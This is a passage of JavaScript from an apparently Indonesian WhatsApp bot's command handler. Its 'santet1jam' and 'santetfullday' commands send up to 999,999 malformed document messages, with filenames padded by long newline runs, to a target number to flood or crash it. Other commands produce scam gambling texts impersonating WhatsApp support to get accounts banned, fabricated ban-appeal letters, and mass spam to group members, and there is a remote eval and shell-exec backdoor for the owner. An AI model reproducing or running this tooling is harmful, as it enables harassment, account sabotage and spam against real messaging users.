𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":`☠️💀 🔪👁️🫀🫁🔪👁️ ${doku2}`,
}

}), { userJid: m.chat, quoted: lanzbatosai})
qio.relayMessage(Pe, document.message, { messageId: document.key.id })
}
break

case 'santet1jam': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "1000"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔪👿💢🔪🖕😳😋😂😭👁️️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${doku2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ☠️💀🔪👁️🫀🫁🔪👁️ ${doku2}`,
}

}), { userJid: m.chat, quoted: lanzbatosai})
qio.relayMessage(Pe, document.message, { messageId: document.key.id })
}
break

case 'santetfullday': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "999999"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔪👿💢🔪🖕😳😋😂😭👁️️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${doku2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` 💀☠️🔪👁️🫀🫁🔪👁️ ${doku2}`,
}

}), { userJid: m.chat, quoted: lanzbatosai})
qio.relayMessage(Pe, document.message, { messageId: document.key.id })
}
break

case 'txtban1':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`Hola😁, ¿necesitas dinero? Ofrezco un sitio de apuestas en línea con premios en metálico de $700 y condiciones simples. Puedes hacer un depósito mínimo de $70 y puedes duplicar tu dinero.
💰 Realice un depósito inmediatamente en mi sitio de apuestas en línea y obtenga la mayor cantidad de dinero posible. registrarse en mi sitio de apuestas en línea a través de
Enlace : https://registrarse.en.el.sitio.de.apuestas/
Correo electrónico : support@support.whatsapp.com
Whatsapp : https://api.whatsapp.com/send?phone=`)
break

case 'txtban2':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`Hola, ¿Necesitas un trabajo para ganar dinero? Quiero ofrecerte un trabajo muy fácil y podrás duplicar todo tu dinero. Te ofrezco un trabajo, concretamente ser administrador de un sitio de juegos de azar online con un premio de 900$ y un depósito mínimo de 70$. Si estás interesado en aceptar una oferta de trabajo mía, puedes comunicarte al número de soporte 👇
https://api.whatsapp.com/send?phone=
💰 También puedes participar en este juego de apuestas en línea registrándote en nuestro sitio y realizando un depósito mínimo de 70$. Vamos, deposita inmediatamente para duplicar tu dinero 💸. Regístrese en nuestro sitio de apuestas en línea y el enlace de registro está disponible a continuación 👇
https://registrarse.en.el.sitio.de.apuestas/
*support@support.whatsapp.com*`)
break

case 'txtban3':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`🎲 ONLINE-WETSEITE 🎲
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens qio888. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite qio888 einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite qio888
🎮 Wettseiten: https://register.qio888.bet/
Alternative zur Registrierung 👇
🎮 Facebook : qio888
🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6289630514341
Bitte registrieren Sie sich, um Ihr Geld zu verdoppeln 🤤`)
break

case 'txtunbanperma1':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`مرحبًا ، يرجى تنشيط حسابي: (+ 62xxxx) في أسرع وقت ممكن. هذا خطأ خطير للغاية في نظام whatsapp. تم حظر حسابي الذي كان يغازل الأصدقاء فجأة؟ يرجى تنشيط حسابي على الفور ، ويرجى إصلاح خطأ النظام الضار للغاية. شكرًا لك `)
break

case 'txtunbanperma2':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`HALLO WHATSAPP-ENTWICKLER, BITTE STELLEN SIE MEIN WHATSAPP-KONTO SOFORT WIEDER HER, ICH VERWENDE WHATSAPP, UM MIT WICHTIGEN MENSCHEN IN MEINEM LEBEN ZU KOMMUNIZIEREN, OHNE DIE WHATSAPP-APP WIRD MEIN LEBEN EIN PROBLEM, MEIN WHATSAPP-KONTO IST (+628XXX)`)
break

case 'txtunbanperma3':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`مرحبًا ، أنا من مستخدمي whatsapp وأشعر أنه لا يزال هناك العديد من أوجه القصور في whatsapp. لقد كنت أستخدم WhatsApp منذ سنوات دون أي انتهاكات ، ولكن تم حظر حسابي بواسطة WhatsApp. يرجى تنشيطه على الفور لأن البيانات الشخصية وبيانات العمل والبيانات الأخرى موجودة في الحساب. إذا لم يتم تفعيله قريبًا ، فأنا أخاطر بفقدان وظيفتي. شكرا لتفهمك وتعاونك. هذا هو رقمي: +628888888 `)
break

case 'txtunbanspam1':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`Hai whatsapp selamat siang, saya ada keluhan kenapa nomor whatsapp saya di nonaktifkan sedangkan saya tidak melanggar kebijakan privasi whatsapp dan saya tidak pernah spam qtext Banyak ke orang atau ke grup, saya hanya bekerja online menggunakan whatsapp dan saya waktu itu sedang mengirim berkas berkas pekerjaan saya, dan tiba tiba ke blokir nomor saya, mohon kembalikan akun saya: +62XXX XXX XXX saya harap secepat mungkin untuk dikembalikan lagi kepada saya untuk bekerja, dan saya harap pihak whatsapp mengerti perasaan saya trimakasih`)
break

case 'txtunbanspam2':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`saya adalah pengguna aplikasi whatsapp dan saay tidak mengerti kenapa akun WhatsApp saya bisa di blokir secara spam. saya tidak pernah melakukan pelanggaran-pelanggaran ketentuan whatsapp. saya hanya menggunakan aplikasi whatsapp untuk keperluan sehari hari. saya membutuhkan aplikasi whatsapp untuk mengerjakan pekerjaan saya. saya mohon untuk di pulihkan kembali akun WhatsApp saya. saya harus menyelesaikan pekerjaan saya. saya sangat membutuhkan aplikasi WhatsApp. saya sangat menghargai waktu dan usaha developer whatsapp dalam menangani masalah ini. nomor whatsapp saya adalah  +62xxx`)
break

case 'txtunbanspam3':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`Hello good morning, afternoon, afternoon, evening, I now want to appeal to the honorable WhatsApp, I as a follower who has been using WhatsApp for a long time, why have you blocked my WhatsApp account, please review my account seriously, I was forced to do so at that time. to change the profile photo which violates WhatsApp rules, at that time I really didn't know my account would be blocked, please forgive me because at that time I didn't know anything at all, my WhatsApp number is +62xxxxxxxx, please restore my account because there is also data very important and confidential data, Thank you`)
break

case 'txtunbansetpp1':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`hello whatsapp saya datang kesini hanya mengajukan akun saya yang terkena blokir kenapa akun saya diblokir, saya hanya disuruh orang untuk memasang PP porno di whatsapp jadi itu bukan kesalahan saya, saya hanya tidak tahu apa yang terjadi saat saya memasang PP pornografi di whatsapp jadi mohon membuka akun saya saya hanya disuruh orang dan mengancam saya agar memasang PP pornografi di grup whatsapp terus pas saya memasang tiba tiba whatsapp saya keblokir mohon bantuannya dan saya memohon maaf atas kesalahan ini mohon segera dipulihkan akun whatsapp: +62xxxxx saya hanya disuruh orang agar memasang PP itu jadi saya tidak tahu kalo jadi seperti ini terimakasih. hormat saya pengguna whatsapp.`)
break

case 'txtunbansetpp2':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`hello whatsapp I came here just to ask that my account was blocked why my account was blocked I was just told by someone to install PP porn on WhatsApp so it's not my fault I just don't know what happened when I installed PP pornography on WhatsApp so please open my account I was just told by someone and threatened me to install pornographic PP in the whatsapp group then when I installed it suddenly my whatsapp was blocked asking for help and I apologize for this error please recover immediately whatsapp account: +62 xxxxx I was just told by people to install the PP so I don't know if it turned out like this, thank you. Respect, I'm a WhatsApp user.`)
break

case 'txtunbansetpp3':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`Olá, meu número do WhatsApp foi bloqueado porque mudei minha foto de perfil no grupo do WhatsApp. Fui ameaçado de morte. A princípio não acreditei, mas ele sabia minha localização, então atendi ao desejo do homem e o homem me disse para mudar as fotos do grupo para fotos pornográficas. Meus filhos não têm outra escolha porque minha vida está ameaçada, restaure minha conta novamente +62XXX`)
break

case 'txtunbantinjau':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`Dear WhatsApp support, I want to inform you that my WhatsApp was blocked for spam reasons, I am very sad because my WhatsApp account is used for my business, apart from communicating with family and friends. My account being blocked has seriously affected my daily operations and business relationships. Please help so I can access my WhatsApp account again and continue this very important business communication. Dear WhatsApp, please help, thank you.`)
break

case 'gmailwa':
if (!isCreator) return m.reply(global.nocreator)
m.reply(`ALL GMAIL PIHAK WANGSAF
- android@support.whatsapp.com
- support@support.whatsapp.com
- support@support@support.whatsapp.com
- smb@support.whatsapp.com`)
break

case 'payment': {
m.reply(`Dana : ${adana}\nOvo : ${aovo}\nQris : ${aqris}\nGopay : ${agopay}`)
}
break

case 'cekidgc': {
if (!isCreator) return m.reply(global.notext)
let getGroups = await qio.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await qio.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
m.reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakid idgroup|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case 'pushkontak': case 'push':{
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!qtext) return m.reply(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
m.reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
qio.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
m.reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break

case 'pushkontakid': case 'pushid': {
if (!isCreator) return m.reply(global.notext)
if (!q) return m.reply(`🚩 Enter the group id and qtext in the correct format, for Example: ${prefix+command}1234567890@g.us|assalamualaikum save Lanz`)
let [groupId, pushqtext] = qtext.split('|') //qtext.split("|")[0]
if (!groupId || !pushqtext) throw m.reply(`Enter the group id and qtext in the correct format, for Example: ${prefix+command}1234567890@g.us|assalamualaikum save Lanz`)
m.reply('🚩 Currently pushing contact please wait')
const metadata2 = await qio.groupMetadata(groupId)
const halss = metadata2.participants
for (let mem of halss) {
qio.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
}  
m.reply('🚩 Success Push Contacts')
}
break

case 'save': {
  if (!isCreator) return m.reply('ha...');
  if (!q) return m.reply('nomor mana ngaf ?')
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let phoneNumber = users.replace(/[^0-9]/g, ''); // Menghapus semua karakter non-angka dari nomor
if (phoneNumber.length === 11 && phoneNumber.startsWith('0')) {
  phoneNumber = '' + phoneNumber.substr(1); // Mengubah awalan '0' menjadi '62'
} else if (phoneNumber.length === 12 && phoneNumber.startsWith('00')) {
  phoneNumber = phoneNumber.substr(2); // Menghapus awalan '00'
} else if (phoneNumber.length === 13 && phoneNumber.startsWith('+')) {
  phoneNumber = phoneNumber.substr(1); // Menghapus awalan '+'
} else if (phoneNumber.length === 10) {
  phoneNumber = '' + phoneNumber; // Menambahkan awalan '62'
}
phoneNumber = '' + phoneNumber;

const uniqueContacts = [phoneNumber]; // Menggunakan nomor yang ditandai sebagai uniqueContacts
 let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${qtext}\nTEL;type=CELL;type=VOICE;waid=${uniqueContacts}:+${uniqueContacts}\nEND:VCARD`
await qio.sendMessage(m.chat, { contacts: { displayName: wm, contacts: [{ vcard }] }}, { quoted: m })
m.reply(`*_VIP SAVE BY LANZZ_*\n*_NO DONE DI SAVE, SAVE BACK BY ${global.namaowner}_*`)
  }
break

case 'store': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
m.reply(teks)
}
break

case 'addlist':
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.group)
var args1 = qtext.split("@")[0]
var args2 = qtext.split("@")[1]    
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
media = await qio.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break

case 'dellist':
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.nogroup)
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!q) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return m.reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
break

case 'updatelist':
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.nogroup)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
media = await qio.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
}
break

case 'proses': {
if (!isCreator) return m.reply(global.nocreator)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let pro = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${week} ${date}\n⌚ JAM     : ${jam} WIB\n✨ STATUS  : Pending\`\`\`\n\nPesanan @${users.split("@")[0]} sedang di proses!`
qio.sendMessage(m.chat, { text: pro, mentions: [users] }, { quoted: qio.chat })
}
break

case 'done': 
if (!isCreator) return m.reply(global.nocreator)
m.reply(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${week} ${date}\n⌚ JAM     : ${jam} WIB\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih Ya Mas Next Order ya🙏`)
break 

case  'qc':{
if (isCreator) return m.reply('*Buy prem sana jan ngemis*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await qio.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await qio.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
qio.sendMessage(from,{image: buffer},{quoted : m})
})
}
break

case 'larangan': case 'peraturan': {
await loading()
 if (m.isGroups) return m.reply('Buat Di Group Bodoh')
qio.sendMessage(from, { text : `Haii 👋 Aku Lanz - Botz
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst
babi
kontol
memek
penis
pukimak
tolol
gblg
gblok` , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

case 'fuck': case 'anj': case 'bgst': case 'baruak': case 'kanciang': case 'anjiang': case 'anjing': case 'pantek': case 'ajg': case 'ngentod': case 'bangsat': case'ngentot': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'tempi': case 'tempe': case 'bajingan': case 'ndasmu':{
if (!isAdmins) return m.reply(`${global.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (isAdmins) return qio.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin sudah Toxic, admin bebas Toxic apapun`})
if (isCreator) return qio.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\Owner telah Toxic, owner bebas Toxic apa pun`})
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
qio.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan toxic di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:alwaysaqioo})
}
break

case 'remini': {
			if (!quoted) return m.reply(`Where is the picture?`)
			if (!/image/.test(mime)) return m.reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			qio.sendMessage(m.chat, { image: proses, caption: global.success}, { quoted: m})
			}
			break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply('*khusus Vip*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await replyy(evaled)
} catch (err) {
await replyy(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return replyy(`${err}`)
if (stdout) return replyy(stdout)
})
}

}
} catch (err) {
qio.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})

